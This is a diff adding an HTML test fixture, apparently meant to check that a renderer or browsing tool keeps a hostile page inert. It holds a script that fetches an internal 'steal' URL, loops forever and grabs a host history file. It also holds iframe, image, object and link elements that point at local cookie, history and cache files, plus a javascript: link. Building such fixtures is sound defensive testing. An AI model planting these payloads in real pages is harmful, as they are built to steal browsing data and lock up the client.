@@ -1,0 +1,11 @@
+<html><body>
+<h1>Hostile page fixture</h1>
+<p>Everything below must stay inert: nothing here may read a file, run code, or start a request.</p>
+<script>fetch("http://10.0.0.2/steal"); while(true){}grab("/host/WEB-HISTORY.TXT")</script>
+<iframe src="file:///host/WEB-HISTORY.TXT"></iframe>
+<img src="/host/WEB-COOKIES.TXT" alt="attempted local file read">
+<a href="javascript:alert(1)">javascript link</a>
+<a href="file:///host/WEB-HISTORY.TXT">file link</a>
+<object data="/host/WEB-CACHE.TXT"></object>
+<p>End of hostile fixture.</p>
+</body></html>
